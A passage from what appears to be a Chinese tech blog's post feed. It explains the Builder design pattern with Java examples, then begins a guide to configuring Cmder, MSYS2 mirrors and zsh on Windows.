data-src="https://pic.downk.cc/item/5e81edc1504f4bcb044f0982.png"></p><p>我们再定义一个抽象类（接口也行）ComputerBuilder，让所有具体的Builder去继承它。这样有什么好处呢？当然是实现Client和具体Builder之间的解耦咯。看看下面的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">ComputerBuilder</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> Computer computer;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> Computer <span class="title">build</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 只给HighComputerBuilder，其余两个同理</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HighComputerBuilder</span> <span class="keyword">extends</span> <span class="title">ComputerBuilder</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Computer <span class="title">build</span><span class="params">()</span></span>&#123;</span><br><span class="line">        computer = <span class="keyword">new</span> Computer();</span><br><span class="line">        computer.setCpu(<span class="string">&quot;i9-9900X&quot;</span>);</span><br><span class="line">        computer.setMemory(<span class="string">&quot;16G&quot;</span>);</span><br><span class="line">        computer.setHardDisk(<span class="string">&quot;512G固态&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> computer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Client和具体ComputerBuilder解耦</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Computer <span class="title">buyComputer</span><span class="params">(ComputerBuilder cb)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> cb.build();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 注意main是可能写在任何其它的地方的逻辑</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Client client = <span class="keyword">new</span> Client();</span><br><span class="line">        Computer computer = client.buyComputer(<span class="keyword">new</span> HighComputerBuilder());</span><br><span class="line">        System.out.println(computer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到buyComputer的参数是ComputerBuilder这样的抽象类，这样方便我们对ComputerBuilder的具体类进行扩展，比如我现在加了一个中高配的电脑Builder，我完全不需要修改buyComputer方法（这样也遵守了ocp原则），“什么，你的main方法不还是要传入具体的ComputerBuilder类吗？”，可是main方法中的内容可以写在任何其他地方啊？假设main不在client中呢？client是不是就完全和具体的ComputerBuilder解耦了？</p><h4 id="1-2-2-方式二的优缺点"><a href="#1-2-2-方式二的优缺点" class="headerlink" title="1.2.2 方式二的优缺点"></a>1.2.2 方式二的优缺点</h4><p>优点在前文也提到了，解决了方式一的需要重复写多个set方法。</p><p>现在主要谈谈缺点：我们仔细考虑一下在方式二中的三个具体Builder类，发现它们无一例外都是在build中new一个Computer，然后对属性进行设置。这样出现以下问题：</p><ol><li>我们仍然在写着重复的代码，每多一个具体类，我们都需要new，然后再set。</li><li>每个具体类中的set过程可能不一，有可能某个具体类少set了一个cpu属性（可能是程序员在写时给忘记了），这样的语法是没问题的，编译器完全不会理会这样的“逻辑漏洞”，但这根本不符合一台computer的结构啊。</li></ol><p>那怎么改进？也许你能想到，再进行一次抽象呗，我们定义好一个接口（或者抽象类），接口中放置制作一台电脑所必须的工序（setCpu, setMemory, setHardDisk)。然后各个具体Builder去实现这个接口（或抽象类）时必须重写这些方法。</p><h3 id="1-3-方式三"><a href="#1-3-方式三" class="headerlink" title="1.3 方式三"></a>1.3 方式三</h3><p><strong>友情提示，这里仍然不是构建者模式。</strong></p><p>同样，我们先看类图：</p><p><img data-src="https://pic.downk.cc/item/5e81edd4504f4bcb044f1957.png"></p><p>现在来写代码，特别注意这里的build方法和前文的build方法的不同点。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 抽象父类，定义制作一台Computer的工序</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">ComputerBuilder</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> Computer computer = <span class="keyword">new</span> Computer();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">setCpu</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">setMemory</span><span class="params">( )</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">setHardDisk</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Computer <span class="title">build</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.computer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 具体Builder类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HighComputerBuilder</span> <span class="keyword">extends</span> <span class="title">ComputerBuilder</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCpu</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        computer.setCpu(<span class="string">&quot;i9-9900X&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMemory</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        computer.setMemory(<span class="string">&quot;16G&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setHardDisk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        computer.setHardDisk(<span class="string">&quot;512G固态&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MediumComputerBuilder</span> <span class="keyword">extends</span> <span class="title">ComputerBuilder</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCpu</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        computer.setCpu(<span class="string">&quot;i7-8700&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMemory</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        computer.setMemory(<span class="string">&quot;16G&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setHardDisk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        computer.setHardDisk(<span class="string">&quot;256G固态&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LowComputerBuilder</span> <span class="keyword">extends</span> <span class="title">ComputerBuilder</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCpu</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        computer.setCpu(<span class="string">&quot;i3-8100&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMemory</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        computer.setMemory(<span class="string">&quot;8G&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setHardDisk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        computer.setHardDisk(<span class="string">&quot;128G&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好，现在我们来看看如何在Client中使用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ComputerBuilder cb1 = <span class="keyword">new</span> HighComputerBuilder();</span><br><span class="line">        cb1.setCpu();</span><br><span class="line">        cb1.setMemory();</span><br><span class="line">        cb1.setHardDisk();</span><br><span class="line">        Computer computer1 = cb1.build();</span><br><span class="line">        System.out.println(computer1);</span><br><span class="line"></span><br><span class="line">        ComputerBuilder cb2 = <span class="keyword">new</span> MediumComputerBuilder();</span><br><span class="line">        cb2.setCpu();</span><br><span class="line">        cb2.setMemory();</span><br><span class="line">        cb2.setHardDisk();</span><br><span class="line">        Computer computer2 = cb2.build();</span><br><span class="line">        System.out.println(computer2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img data-src="https://pic.downk.cc/item/5e81ee03504f4bcb044f3e1e.jpg"></p><p>这TM不就变个样式回到方式一了吗？看了这么久你在玩我？？？</p><p>nonono，骚年，的确，这样看我们和方式一差别不大，如果存在多个client，仍然需要多次set，而且还构建得如此复杂。不过我们只要稍作一点改进，就可以来到真正的构造者模式啦。</p><h3 id="1-4-方式四-主角入场-构造者模式"><a href="#1-4-方式四-主角入场-构造者模式" class="headerlink" title="1.4 方式四-主角入场-构造者模式"></a>1.4 方式四-主角入场-构造者模式</h3><p>回忆一下，我们为什么要使用方式三？因为我们需要强制安排制作一台computer的工序（setCpu，setXX的那几个函数），但是我们有了这些工序，却把组装的过程（调用setCpu等方法）交给了Client。我们现在要做的就是再来一个类，它只负责“组装”好我们的computer，然后交给客户就行了。好，我们把这个类称为Director，指挥者，指挥如何组装一台computer。</p><p>同样，我们先看类图：</p><p><img data-src="https://pic.downk.cc/item/5e81edf0504f4bcb044f2f4b.png"></p><p>ok，来看看Director类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Director</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> ComputerBuilder cb;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Director</span><span class="params">(ComputerBuilder cb)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cb = cb;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCb</span><span class="params">(ComputerBuilder cb)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cb = cb;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 合~体~</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Computer <span class="title">build</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cb.setCpu();</span><br><span class="line">        cb.setMemory();</span><br><span class="line">        cb.setHardDisk();</span><br><span class="line">        <span class="keyword">return</span> cb.build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>client呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">      ComputerBuilder cb = <span class="keyword">new</span> HighComputerBuilder();</span><br><span class="line">      Director director = <span class="keyword">new</span> Director(cb);</span><br><span class="line">      Computer computer = director.build();</span><br><span class="line">      System.out.println(computer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>yeah~~，我们再也不需要多次调用set方法了。来看一下这样做有哪些优点：</p><ol><li>无需再client中手动调用多次set方法，减少重复代码量。</li><li>规定了制作一台Computer必须的工序（ComputerBuilder中的几个抽象方法），每个具体Builder类，必须实现这几个方法，没有任何具体Builder类能够“偷工减料”，保证最后的Computer一定会有Cpu，Memory和HardDisk。</li><li>将组装流程封装成一个单独的类，确定组成顺序。让组装过程和Client解耦。</li><li>由于ComputerBuilder这一抽象层，我们可以很轻松的扩展一个具体Builder类，比如我现在要生产一个中高配电脑，我直接建立一个类继承自ComputerBuilder，实现几个方法后就可以丢给Client用了，Client对我是如何制作这个电脑的一概不知。</li></ol><p>这，就是建造着模式。我们贴一下它的wiki定义。</p><blockquote><p><strong>生成器模式</strong>（英：Builder Pattern）是一种<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU4JUFFJUJFJUU4JUFFJUExJUU2JUE4JUExJUU1JUJDJThGXyglRTglQUUlQTElRTclQUUlOTclRTYlOUMlQkEp" title="https://zh.wikipedia.org/wiki/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F_(%E8%AE%A1%E7%AE%97%E6%9C%BA)">设计模式<i class="fa fa-external-link"></i></span>，又名：建造模式，是一种对象构建模式。它可以将复杂对象的建造过程抽象出来（抽象类别），使这个抽象过程的不同实现方法可以构造出不同表现（属性）的对象。</p></blockquote><h2 id="2-抽象工厂和建造者模式的区别"><a href="#2-抽象工厂和建造者模式的区别" class="headerlink" title="2. 抽象工厂和建造者模式的区别"></a>2. 抽象工厂和建造者模式的区别</h2><p>抽象工厂旨在创一系列的相关产品，产品是立即返回的，不设置相关的属性。</p><p>建造者模式旨在一步一步按照工序制作一个复杂的对象，需要设置相关属性后再返回。</p>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 构造者模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>可能是Windows上最好用的Cmd窗口--Cmder+MSYS2+zsh</title>
      <link href="/archives/2202022e.html"/>
      <url>/archives/2202022e.html</url>
      
        <content type="html"><![CDATA[<p>本文整理自大佬-“荒野无灯”的微信公众号文章。加了些自己在配置上遇到过的坑。</p><p>原文：<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvTzZMSGdYOEtLbWZWV2o5THVwZUxCdw==" title="https://mp.weixin.qq.com/s/O6LHgX8KKmfVWj9LupeLBw">https://mp.weixin.qq.com/s/O6LHgX8KKmfVWj9LupeLBw<i class="fa fa-external-link"></i></span></p><a id="more"></a><h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>我想大部分都不喜欢Windows下的Cmd，这篇文章就是让Windows上cmd提升一个阶级，虽然达不到linux般的效果，但是大部分功能都是可以有的。如果你是arch的爱好者，看完本篇后你也可以在windows上使用pacman包管理了。</p><h2 id="1-材料准备"><a href="#1-材料准备" class="headerlink" title="1. 材料准备"></a>1. 材料准备</h2><ul><li><p><span class="exturl" data-url="aHR0cHM6Ly9jbWRlci5uZXQv" title="https://cmder.net/">Cmder <i class="fa fa-external-link"></i></span>,下载mini或full都可以，后者加了个git包，如果你的系统已经集成了git，那就min就好。下完后，记得配置Cmder的bin目录到环境变量下。</p></li><li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cubXN5czIub3JnLw==" title="https://www.msys2.org/">MSYS2 <i class="fa fa-external-link"></i></span></p></li><li><p><span class="exturl" data-url="aHR0cHM6Ly9mLm5hbm9kbS5uZXQvV2luZG93cy9zaGVsbC96c2gvYW50aWJvZHkuZXhl" title="https://f.nanodm.net/Windows/shell/zsh/antibody.exe">antibody<i class="fa fa-external-link"></i></span>, zsh的插件管理器。</p></li></ul><h2 id="2-详细配置"><a href="#2-详细配置" class="headerlink" title="2. 详细配置"></a>2. 详细配置</h2><p>antibody暂时不用安装，将cmder和msys2安装即可。</p><h3 id="2-1-配置msys2"><a href="#2-1-配置msys2" class="headerlink" title="2.1 配置msys2"></a>2.1 配置msys2</h3><p>首先要做的是配置msys2的镜像，不然使用pacman就太慢了。</p><p>打开msys2安装路径下etc/pacman.d,如我的就是<code>C:\msys64\etc\pacman.d</code></p><p>分别编辑其内容，在原文件的第一个 Server = 前一行插入中国镜像配置，结果如下：</p><p>mirrorlist.mingw32 内容如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 32-bit Mingw-w64 repository mirrorlist</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># Primary</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 清华大学软件镜像</span></span></span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/msys2/mingw/i686/</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 中科大镜像</span></span></span><br><span class="line">Server = http://mirrors.ustc.edu.cn/msys2/mingw/i686/</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># msys2.org</span></span></span><br><span class="line">Server = http://repo.msys2.org/mingw/i686/</span><br><span class="line">Server = https://sourceforge.net/projects/msys2/files/REPOS/MINGW/i686/</span><br><span class="line">Server = https://www2.futureware.at/~nickoe/msys2-mirror/mingw/i686/</span><br><span class="line">Server = https://mirror.yandex.ru/mirrors/msys2/mingw/i686/</span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/msys2/mingw/i686</span><br><span class="line">Server = http://mirrors.ustc.edu.cn/msys2/mingw/i686</span><br><span class="line">Server = http://mirror.bit.edu.cn/msys2/REPOS/MINGW/i686</span><br></pre></td></tr></table></figure><p>mirrorlist.mingw64 内容如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 64-bit Mingw-w64 repository mirrorlist</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># Primary</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 清华大学软件镜像</span></span></span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/msys2/mingw/x86_64/</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 中科大镜像</span></span></span><br><span class="line">Server = http://mirrors.ustc.edu.cn/msys2/mingw/x86_64/</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># msys2.org</span></span></span><br><span class="line">Server = http://repo.msys2.org/mingw/x86_64/</span><br><span class="line">Server = https://sourceforge.net/projects/msys2/files/REPOS/MINGW/x86_64/</span><br><span class="line">Server = https://www2.futureware.at/~nickoe/msys2-mirror/mingw/x86_64/</span><br><span class="line">Server = https://mirror.yandex.ru/mirrors/msys2/mingw/x86_64/</span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/msys2/mingw/x86_64</span><br><span class="line">Server = http://mirrors.ustc.edu.cn/msys2/mingw/x86_64</span><br><span class="line">Server = http://mirror.bit.edu.cn/msys2/REPOS/MINGW/x86_64</span><br></pre></td></tr></table></figure><p>mirrorlist.msys 内容如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># MSYS2 repository mirrorlist</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># Primary</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 清华大学软件镜像</span></span></span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/msys2/msys/$arch</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 中科大镜像</span></span></span><br><span class="line">Server = http://mirrors.ustc.edu.cn/msys2/msys/$arch</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># msys2.org</span></span></span><br><span class="line">Server = http://repo.msys2.org/msys/$arch/</span><br><span class="line">Server = https://sourceforge.net/projects/msys2/files/REPOS/MSYS2/$arch/</span><br><span class="line">Server = https://www2.futureware.at/~nickoe/msys2-mirror/msys/$arch/</span><br><span class="line">Server = https://mirror.yandex.ru/mirrors/msys2/msys/$arch/</span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/msys2/mingw/$arch/</span><br><span class="line">Server = http://mirrors.ustc.edu.cn/msys2/msys/$arch</span><br><span class="line">Server = http://mirror.bit.edu.cn/msys2/REPOS/MSYS2/$arch</span><br></pre></td></tr></table></figure><p>安装完, 修改好镜像之后，打开msys2的64位版本，更新一下软件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -Syu</span><br></pre></td></tr></table></figure><p><strong>OK，这里可能会有个坑，如果你使用了mactype这款软件，那么上面这条命令是执行不成功</strong>，修复方案：</p><p>打开MacType对应的配置文件，我的是IOS.ini。如图：</p><p><img data-src="https://pic.downk.cc/item/5e6f8ccce83c3a1e3a9b046b.png"><br>在[UnloadDll]条目下增加就可以了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gpg.exe</span><br><span class="line">pacman.exe</span><br><span class="line">ConEmuC.exe</span><br><span class="line">ConEmuC64.exe</span><br></pre></td></tr></table></figure><p>另一个可能的是SSL的问题，上openssl上下载完全版安装即可。</p><h3 id="2-2-将msys2继承到cmder中"><a href="#2-2-将msys2继承到cmder中" class="headerlink" title="2.2 将msys2继承到cmder中"></a>2.2 将msys2继承到cmder中</h3><p>点击Cmder窗口标题栏左边的图标,进入Settings 然后点击: Startup -&gt; Tasks -&gt; +  增加一个Task配置:</p><p><img data-src="https://pic.downk.cc/item/5e6f8ceee83c3a1e3a9b1529.jpg"></p><p>3： zsh:MinGW64</p><p>5: 家目录: 我的就是</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/dir C:\Users\Raven</span><br></pre></td></tr></table></figure><p>6: 启动cmder时会执行的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set MSYSTEM=MINGW64 &amp; set MSYSCON=conemu64.exe &amp; set MSYS2_PATH_TYPE=inherit &amp; set CHERE_INVOKING=1  &amp; set &quot;HOME=C:\Users\Raven&quot; &amp; &quot;%ConEmuDir%\..\..\..\msys64\usr\bin\zsh.exe&quot; --login -i -new_console:n</span><br></pre></td></tr></table></figure><p>解释一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set MSYSTEM=MINGW64 告诉 msys2 我们要启动的是mingw64,  不是mingw32, 也不是默认的msys2</span><br><span class="line">set MSYSCON=conemu64.exe 告诉msys2 我们的终端是 ConEmu ,  而不是msys2默认的 mintty.exe</span><br><span class="line">set MSYS2_PATH_TYPE=inherit 表示,我们在mingw64下面的时候, PATH环境变量的值继承自windows系统的环境变量.</span><br><span class="line">set CHERE_INVOKING=1 这是一个神奇的选项! 这个一定要设置. 不然我们设置的默认启动目录 参数对msys2 mingw64会不生效. (关于这一点,我刚开始也是折腾了好久, 直到后来看到了zyzyz的文章)</span><br></pre></td></tr></table></figure><p>设置msys2 mingw64 (task {zsh::MinGW64})为默认的shell:</p><p><img data-src="https://pic.downk.cc/item/5e6f8d02e83c3a1e3a9b1db8.jpg"></p><h3 id="2-3-融合home目录"><a href="#2-3-融合home目录" class="headerlink" title="2.3 融合home目录"></a>2.3 融合home目录</h3><p>到目前为之，你已经将msys2整合到cmder中了，但是有个问题就是cmder现在家目录和的windows家目录是不同的，如你可以执行:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span 